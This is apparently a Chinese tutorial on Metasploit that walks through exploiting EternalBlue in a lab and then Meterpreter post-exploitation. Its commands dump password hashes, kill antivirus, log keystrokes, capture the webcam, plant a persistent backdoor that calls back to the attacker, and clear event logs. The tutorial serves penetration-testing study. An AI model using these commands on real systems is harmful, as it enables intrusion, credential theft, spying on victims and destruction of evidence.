## Metasploit

Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。我们接下来以大名鼎鼎的永恒之蓝MS17_010漏洞为切入点，讲解MSF框架的使用。

**MSF的更新****：**msfupdate

![](https://p3.ssl.qhimg.com/t01ee3308ff1297b30f.png)

## Metasploit的安装和升级

在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架。

**一键安装**

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall   
adduser msf           #添加msf用户
su msf                #切换到msf用户
cd  /opt/metasploit-framework/bin   #切换到msf所在的目录 
./msfconsole          #以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库  
​
也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了
ln -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole
​
#备注：
#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用 msfdb reinit 命令，然后使用非root用户初始化数据库。        
​
MSF后期的升级：msfupdate
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

**使用方法：**

·  进入框架：msfconsole

·  使用search命令查找相关漏洞： search ms17-010

·  使用use进入模块: use exploit/windows/smb/ms17_010_eternalblue

·  使用info查看模块信息： info

·  设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp

·  查看模块需要配置的参数：show options

·  设置参数：set RHOST 192.168.125.138

·  攻击：exploit / run

·  后渗透阶段

不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。

我们也可以将攻击代码写入 configure.rc（只要是以 .rc 结尾的文件）配置文件中，然后使用命令msfconsole -r configure.rc 进行自动攻击！

## MSF中加载自定义的exploit模块

参考文章：[CVE-2019-0708 远程桌面漏洞复现](https://blog.csdn.net/qq_36119192/article/details/100609875) ，该文中介绍了如果加载自定义的exploit模块并且成功攻击。

## 漏洞利用(exploit)

漏洞利用exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。

exploit漏洞利用模块路径：/usr/share/metasploit-framework/modules/exploits

![](https://p2.ssl.qhimg.com/t01200ff594310525a6.png)

这里面有针对不同平台的 exploit 。

我们现在就进 windows 平台看看，这里会列出针对windows平台不同服务的漏洞利用

![](https://p3.ssl.qhimg.com/t01afbbe34ae34e6532.png)

我们进入**smb**服务，这是windows中经常爆出漏洞的服务，比如我们的永恒之蓝漏洞就在这里面。漏洞利用代码是以 rb 结尾的文件，因为metasploit是用Ruby语言编写的。

![](https://p0.ssl.qhimg.com/t01f5344ab3074dd872.png)

## 攻击载荷(payload)

payload模块路径：/usr/share/metasploit-framework/modules/payloads

![](https://p0.ssl.qhimg.com/t012ea9ae5635a15b21.png)![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。

**Shellcode** ：Shellcode是payload中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令 之后，才会提供一个命令行shell。

Metasploit中的 Payload 模块主要有以下三种类型：

> > - -Single
> >     
> > - -Stager
> >     
> > - -Stage
> >     

- ·  Single是一种完全独立的Payload，而且使用起来就像运行 calc.exe 一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似 netcat 这样的非metasploit处理工具所捕捉到。
- ·  Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。
- ·  Stage是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。

在 Metasploit 中，我们可以通过Payload的名称和使用格式来推断它的类型：

```xml
Single Payload的格式为：<target>/ <single>  如：windows/powershell_bind_tcp
Stager/Stage Payload的格式为：<target>/ <stage> / <stager>  如：windows/meterpreter/reverse_tcp
```

当我们在Metasploit中执行 show payloads 命令之后，它会给我们显示一个可使用的Payload列表：

在这个列表中，像 windows/powershell_bind_tcp 就是一个Single Payload，它不包含Stage Payload

而 windows/meterpreter/reverse_tcp 则由一个**Stage Payload**（**meterpreter**）和 一个**Stager Payload**（**reverse_tcp**）组成

**Stager中几种常见的payload**

```bash
windows/meterpreter/bind_tcp       #正向连接
windows/meterpreter/reverse_tcp    #反向连接，常用
windows/meterpreter/reverse_http   #通过监听80端口反向连接
windows/meterpreter/reverse_https  #通过监听443端口反向连接

正向连接使用场景：我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了

反向连接使用场景：我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。

反向连接80和443端口使用场景：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或443端口与外部通信
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

## Meterpreter

Meterpreter属于**stage payload**，在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。

Meterpreter是如何工作的？

首先目标先要执行初始的溢出漏洞会话连接，可能是 bind正向连接，或者反弹 reverse 连接。反射连接的时候加载dll链接文件，同时后台悄悄处理 dll 文件。其次Meterpreter核心代码初始化,通过 socket套接字建立一个TLS/1.0加密隧道并发送GET请求给Metasploit服务端。Metasploit服务端收到这个GET请求后就配置相应客户端。最后，Meterpreter加载扩展，所有的扩展被加载都通过TLS/1.0进行数据传输。

Meterpreter的特点：

·  Meterpreter完全驻留在内存，没有写入到磁盘

·  Meterpreter注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程

·  默认情况下， Meterpreter的通信是加密的，所以很安全

·  扩展性，许多新的特征模块可以被加载。

我们在设置 payloads 时，可以将 payloads 设置为：windows/meterpreter/reverse_tcp ，然后获得了 meterpreter> 之后我们就可以干很多事了！具体的做的事，在我们下面的后渗透阶段都有讲！

## MS17_010(永恒之蓝)

我们现在模拟使用 MS17_010 漏洞攻击，这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞。

kali控制台输入：msfconsole 进入metasploit框架

![](https://p3.ssl.qhimg.com/t01cb7b94630bc6c4eb.png)

寻找MS17_010漏洞： search ms17_010

![](https://p3.ssl.qhimg.com/t0110f77c72fd2ac8b6.png)

这里找到了两个模块，第一个**辅助模块**是探测主机是否存在MS17_010漏洞，第二个是漏洞利用模块，我们先探测哪些主机存在漏洞

### Auxiliary辅助探测模块

该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。

输入命令：use auxiliary/scanner/smb/smb_ms17_010

![](https://p5.ssl.qhimg.com/t017f5159a9b8b9cfae.png)

查看这个模块需要配置的信息：show options

![](https://p0.ssl.qhimg.com/t018ae45cc9ac281ab0.png)

RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞

输入：set RHOSTS 192.168.125.125-129.168.125.140

![](https://p4.ssl.qhimg.com/t0180c7bf0d169789e1.png)

输入：exploit 攻击，这里有+号的就是可能存在漏洞的主机，这里有3个主机存在漏洞

![](https://p0.ssl.qhimg.com/t0149a04badd9e74610.png)

### Exploit漏洞利用模块

然后我们就可以去利用漏洞攻击了，选择漏洞攻击模块： use exploit/windows/smb/ms17_010_eternalblue

查看这个漏洞的信息：info

![](https://p3.ssl.qhimg.com/t01c1f21ec58a181b90.png)

查看可攻击的系统平台，这个命令显示该攻击模块针对哪些特定操作系统版本、语言版本的系统：show targets

这里只有一个，有些其他的漏洞模块对操作系统的语言和版本要求的很严，比如MS08_067，这样就要我们指定目标系统的版本的。如果不设置的话，MSF会自动帮我们判断目标操作系统的版本和语言(利用目标系统的指纹特征)

![](https://p4.ssl.qhimg.com/t01ef0d809f01b677c7.png)

### Payload攻击载荷模块

攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。

查看攻击载荷：show payloads

该命令可以查看当前漏洞利用模块下可用的所有Payload

![](https://p0.ssl.qhimg.com/t01fd726c8da20bc322.png)

设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp

![](https://p0.ssl.qhimg.com/t01fb857031754efb71.png)![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

查看模块需要配置的参数： show options

![](https://p0.ssl.qhimg.com/t0110407a19c0a029fc.png)

设置RHOST，也就是要攻击主机的ip：set RHOST 192.168.125.138

设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell：set LHOST 192.168.125.129

如果我们这里不设置lport的话，默认是4444端口监听

![](https://p2.ssl.qhimg.com/t01175f0eb1c5996dae.png)

攻击： exploit

![](https://p1.ssl.qhimg.com/t0158eb66ca3f2f03a6.png)

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

## 后渗透阶段

运行了exploit命令之后，我们开启了一个reverse TCP监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 meterpreter > 出现，我们输入： shell 即可切换到目标主机的windows shell，要想从目标主机shell退出到 meterpreter ，我们只需输入：exit

![](https://p1.ssl.qhimg.com/t01043670323b1204f7.png)

我们要想从 meterpreter 退出到MSF框架，输入：background

![](https://p2.ssl.qhimg.com/t0131b26b0d384fecc7.png)

输入： sessions -l 查看我们获得的shell，前面有id

输入： sessions -i 1 即可切换到id为1的shell

![](https://p0.ssl.qhimg.com/t018d77f01ef8f81fd6.png)![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

输入：shell 即可进入 cmd 类型的控制，再输入：powershell ，即可进入 powershell 类型的控制台

![](https://p2.ssl.qhimg.com/t01ad9e440268f58bde.png)![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

```bash
sysinfo             #查看目标主机系统信息
run scraper         #查看目标主机详细信息
run hashdump        #导出密码的哈希
load kiwi           #加载mimikatz
ps                  #查看目标主机进程信息
pwd                 #查看目标当前目录(windows)
getlwd              #查看目标当前目录(Linux)
search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件
download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下
upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下
getpid              #查看当前Meterpreter Shell的进程PID
migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
idletime            #查看主机运行时间
getuid              #查看获取的当前权限
getsystem           #提权,获得的当前用户是administrator才能成功
run  killav         #关闭杀毒软件
screenshot          #截图
webcam_list         #查看目标主机的摄像头
webcam_snap         #拍照
webcam_stream       #开视频
execute  参数  -f 可执行文件   #执行可执行程序
run getgui -u hack -p 123    #创建hack用户，密码为123
run getgui -e                #开启远程桌面
keyscan_start                #开启键盘记录功能
keyscan_dump                 #显示捕捉到的键盘记录信息
keyscan_stop                 #停止键盘记录功能
uictl  disable  keyboard     #禁止目标使用键盘
uictl  enable   keyboard     #允许目标使用键盘
uictl  disable  mouse        #禁止目标使用鼠标
uictl  enable   mouse        #允许目标使用鼠标
load                         #使用扩展库
run                          #使用扩展库
​
run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
clearev                       #清除日志
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

### Post 后渗透模块

该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。

```bash
run post/windows/manage/migrate           #自动进程迁移
run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上
run post/windows/manage/killav            #关闭杀毒软件
run post/windows/manage/enable_rdp        #开启远程桌面服务
run post/windows/manage/autoroute         #查看路由信息
run post/windows/gather/enum_logged_on_users    #列举当前登录的用户
run post/windows/gather/enum_applications       #列举应用程序
run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码
run post/windows/gather/smart_hashdump               #dump出所有用户的hash
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

输入：sysinfo 查看目标主机的信息

![](https://p0.ssl.qhimg.com/t011f3e4c70f85ed98b.png)

### 查看主机是否运行在虚拟机上

```bash
run post/windows/gather/checkvm
```

![](https://p2.ssl.qhimg.com/t0176969a7badeb58d5.png)

### 关闭杀毒软件

拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：

```undefined
run  killav
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)![](https://p2.ssl.qhimg.com/t013d2b833b71ef586a.png)

### 获取目标主机的详细信息

使用命令：

```undefined
run scraper 
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

它将目标机器上的常见信息收集起来然后下载保存在本地

![](https://p0.ssl.qhimg.com/t01177f7165b149a9e7.png)

### 访问文件系统

Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下：

> > cd：切换目标目录；
> > 
> > cat：读取文件内容；
> > 
> > rm：删除文件；
> > 
> > edit：使用vim编辑文件
> > 
> > ls：获取当前目录下的文件；
> > 
> > mkdir：新建目录；
> > 
> > rmdir：删除目录；

![](https://p1.ssl.qhimg.com/t016a75bdfa3dc88a96.png)

### 上传/下载文件

download file 命令可以帮助我们从目标系统中下载文件

upload file 命令则能够向目标系统上传文件。

![](https://p5.ssl.qhimg.com/t0185b5998ba39b3767.png)

### 权限提升

有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个getsystem 命令，它可以使用多种技术在目标系统中实现提权：

getuid 命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为 NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。

注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！

![](https://p0.ssl.qhimg.com/t01171e784cd8d9a77a.png)

### 获取用户密码

传送门：[MSF中获取用户密码](https://xie1997.blog.csdn.net/article/details/105815134)

### 运行程序

先查看目标主机安装了哪些应用

run post/windows/gather/enum_applications

![](https://p4.ssl.qhimg.com/t01beb52fe5fa6a261c.png)

我们还可以使用 execute 命令在目标系统中执行应用程序。这个命令的使用方法如下：

```lua
execute  参数  -f 可执行文件  
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

运行后它将执行所指定的命令。可选参数如下：

> > -f：指定可执行文件
> > 
> > -H：创建一个隐藏进程
> > 
> > -a：传递给命令的参数
> > 
> > -i： 跟进程进行交互
> > 
> > -m：从内存中执行
> > 
> > -t： 使用当前伪造的线程令牌运行进程
> > 
> > -s： 在给定会话中执行进程

![](https://p1.ssl.qhimg.com/t01ee6d622313a79056.png)

### 屏幕截图

输入：screenshot ，截图目标主机屏幕，可以看到，图片被保存到了　/root 目录下

![](https://p5.ssl.qhimg.com/t01f6d73e5c9998532b.png)

### 创建一个新账号

先查看目标主机有哪些用户

run post/windows/gather/enum_logged_on_users

![](https://p3.ssl.qhimg.com/t01f9aa5605f9049d77.png)

接下来，我们可以在目标系统中创建一个新的用户账号：run getgui -u hack -p 123，这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。

这里成功创建了用户，但是添加到Administrators组中失败了 !

![](https://p0.ssl.qhimg.com/t012628304a3a8dda87.png)

如果添加到Administrators组中失败了的话，我们可以运行：shell ，进行cmd窗口手动将该用户添加到administrators组中。

### 启用远程桌面

当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。

首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），不过我们的 getgui 脚本可以帮我们搞定。我们可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启），我们输入： run getgui -e 或者 run post/windows/manage/enable_rdp

在开启远程桌面会话之前，我们还需要使用“idletime”命令检查远程用户的空闲时长： idletime

![](https://p4.ssl.qhimg.com/t0183f8c3cd0d466967.png)![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

然后我们就可以使用远程桌面用我们创建的用户远程登录目标主机了。由于上一步创建的用户没有被添加到远程桌面用户组中，所以这一步就没法演示。

### 键盘记录

Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：

> > keyscan_start：开启键盘记录功能
> > 
> > keyscan_dump：显示捕捉到的键盘记录信息
> > 
> > keyscan_stop：停止键盘记录功能

不过在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录

### 进程迁移

Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。

在下面的例子中，我们会将Meterpreter跟 winlogon.exe 绑定，并在登录进程中捕获键盘记录，以获得用户的密码。

首先，我们需要使用： ps 命令查看目标设备中运行的进程：

![](https://p3.ssl.qhimg.com/t01f22561429f95841d.png)

我们可以使用： getpid 查看我们当前的进程id

使用： migrate 目标进程ID 命令来绑定目标进程id，这里绑定目标pid的时候，经常会断了 shell。进程迁移后会自动关闭原来进程，没有关闭可使用 kill pid 命令关闭进程。或者使用自动迁移进程（run post/windows/manage/migrate）命令，系统会自动寻找合适的进程然后迁移。

![](https://p5.ssl.qhimg.com/t014279790b980a1b1e.png)

绑定完成之后，我们就可以开始捕获键盘数据了，可以看到，用户输入了 123 然后回车，说明密码是 123

![](https://p1.ssl.qhimg.com/t013e1e83e86fe80595.png)![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

### 禁止目标主机使用键盘鼠标

·  禁止(允许)目标使用键盘： uictl disable (enable) keyboard

·  禁止(允许)目标使用鼠标： uictl disable (enable) mouse

### 用目标主机摄像头拍照

·  获取目标系统的摄像头列表：webcam_list

·  从指定的摄像头，拍摄照片：webcam_snap

·  从指定的摄像头，开启视频：webcam_stream

可以看到啊，目标主机有一个摄像头

![](https://p5.ssl.qhimg.com/t0123e9407a69b82c96.png)

于是，我们拍一张照片看看，可以看到，已经拍完了照，并且显示出来了

![](https://p4.ssl.qhimg.com/t01b8cf37b17d857b3b.png)

我们再来开启视频试试，开启摄像头拍摄视频。他会弹出一个网页，可以查看到摄像头那端的实时操作，相当于直播

![](https://p2.ssl.qhimg.com/t0178aa298db9708ebb.png)

### 使用扩展库

输入 load 或者 run 然后双击table

![](https://p4.ssl.qhimg.com/t0162d81287b866ae2a.png)

### 生成持续性后门

因为 meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。

建立持续性后门有两种方法，一种是通过**启动项启动**(persistence) ，一种是通过 **服务启动**(metsvc)

**启动项启动**

启动项启动的话，我们先生成一个后门工具，传送门——> [用MSF生成一个后门木马](https://blog.csdn.net/qq_36119192/article/details/83869141)

然后放到windows的启动目录中：

```makefile
C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)

这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。

**服务启动**

通过服务启动，我们可以运行命令

```yaml
run persistence -X -i 5 -p 8888 -r 192.168.10.27  #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
​
#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)![](https://p2.ssl.qhimg.com/t013e5f61155b137195.png)

我们在被攻击机可以看到这个文件，是一个VBScript脚本

![](https://p4.ssl.qhimg.com/t01336794669f65f61f.png)

查看靶机的端口连接情况，可以看到靶机连着我们的8888端口

![](https://p4.ssl.qhimg.com/t01a2f2ddbf5d84965a.png)

### 设置Socks代理

传送门：[MSF搭建socks代理](https://xie1997.blog.csdn.net/article/details/105872076)

### portfwd端口转发

portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下

```yaml
portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)![](https://p5.ssl.qhimg.com/t01bf06d9d40a3ae059.png)

然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了

```undefined
rdesktop 127.0.0.1:3389
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)![](https://p4.ssl.qhimg.com/t01812bd9a9d08b58f9.png)

### 清除事件日志

完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令 clearev 命令来清除事件日志：

![](https://p1.ssl.qhimg.com/t01eadfbd8af4b66e24.png)

## 导入并执行PowerShell脚本

如果powershell脚本是用于域内信息收集的，则获取到的权限用户需要是域用户

```bash
load powershell            #加载powershell功能
powershell_import /root/PowerView.ps1      #导入powershell脚本，提前将该powershell脚本放到指定目录
powershell_execute Get-NetDomain     #执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块
powershell_execute Invoke-UserHunter  #该功能模块用于定位域管理员登录的主机
powershell_execute Get-NetForest      #该模块用于定位域信息
```

![点击并拖拽以移动](https://p4.ssl.qhimg.com/t012eb09f21483b324d.gif)![](https://p5.ssl.qhimg.com/t0142cb132886331f64.png)

![](https://p4.ssl.qhimg.com/t011d04c17539196b4c.png)

## 加载stdapi

有时候虽然我们获取到了meterpreter，但是执行一些命令会显示没有该命令，这时我们可以执行：load stdapi来加载，这样我们就可以执行命令了。

![](https://p0.ssl.qhimg.com/t010db0ff92a108cc72.png)

## 升级Session

有时候，当我们收到的不是 meterpreter 类型的 session 的话，可能不好操作。我们可以执行命令 sessions -u id 来升级session。执行该命令，默认调用的是 post/multi/manage/shell_to_meterpreter 模块。

![](https://p5.ssl.qhimg.com/t010d636b70096eb563.png)

## Meterpreter的更多用法

### Core Commands 核心命令

Command Description

---

? Help menubackground Backgrounds the current session bgkill Kills a background meterpreter script bglist Lists running background scripts bgrun Executes a meterpreter script as a background thread channel Displays information or control active channels close Closes a channel disable_unicode_encoding Disables encoding of unicode strings enable_unicode_encoding Enables encoding of unicode stringsexit Terminate the meterpreter session get_timeouts Get the current session timeout valueshelp Help menuinfo Displays information about a Post module irb Drop into irb scripting mode load Load one or more meterpreter extensions machine_id Get the MSF ID of the machine attached to the sessionmigrate Migrate the server to another processquit Terminate the meterpreter session read Reads data from a channel resource Run the commands stored in a file run Executes a meterpreter script or Post module set_timeouts Set the current session timeout values sleep Force Meterpreter to go quiet, then re-establish session. transport Change the current transport mechanism use Deprecated alias for ‘load’ uuid Get the UUID for the current session write Writes data to a channel

### Stdapi: File system Commands 文件系统命令

Command Description

---

cat Read the contents of a file to the screen cd Change directory dir List files (alias for ls) download Download a file or directory edit Edit a file getlwd Print local working directory getwd Print working directory lcd Change local working directory lpwd Print local working directory ls List files mkdir Make directory mv Move source to destination pwd Print working directory rm Delete the specified file rmdir Remove directory search Search for files show_mount List all mount points/logical drives upload Upload a file or directory

### Stdapi: Networking Commands 网络命令

Command Description

---

arp Display the host ARP cache getproxy Display the current proxy configurationifconfig Display interfacesipconfig Display interfacesnetstat Display the network connections portfwd Forward a local port to a remote service route View and modify the routing table

### Stdapi: System Commands 系统命令

Command Description

---

clearev Clear the event log drop_token Relinquishes any active impersonation token. execute Execute a command getenv Get one or more environment variable values getpid Get the current process identifier getprivs Attempt to enable all privileges available to the current process getsid Get the SID of the user that the server is running as getuid Get the user that the server is running as kill Terminate a process ps List running processes reboot Reboots the remote computer reg Modify and interact with the remote registry rev2self Calls RevertToSelf() on the remote machine shell Drop into a system command shell shutdown Shuts down the remote computer steal_token Attempts to steal an impersonation token from the target process suspend Suspends or resumes a list of processes sysinfo Gets information about the remote system, such as OS

### Stdapi: User interface Commands 用户界面命令

Command Description

---

enumdesktops List all accessible desktops and window stations getdesktop Get the current meterpreter desktop idletime Returns the number of seconds the remote user has been idle keyscan_dump Dump the keystroke buffer keyscan_start Start capturing keystrokes keyscan_stop Stop capturing keystrokes screenshot Grab a screenshot of the interactive desktop setdesktop Change the meterpreters current desktop uictl Control some of the user interface components

### Stdapi: Webcam Commands 摄像头命令

Command Description

---

record_mic Record audio from the default microphone for X seconds webcam_chat Start a video chat webcam_list List webcams webcam_snap Take a snapshot from the specified webcam webcam_stream Play a video stream from the specified webcam

### Priv: Elevate Commands 提权命令

Command Description

---

getsystem Attempt to elevate your privilege to that of local system.

### Priv: Password database Commands 密码

Command Description

---

hashdump Dumps the contents of the SAM database

### Priv: Timestomp Commands 时间戳命令

Command Description

---

**timestomp** Manipulate file MACE attributes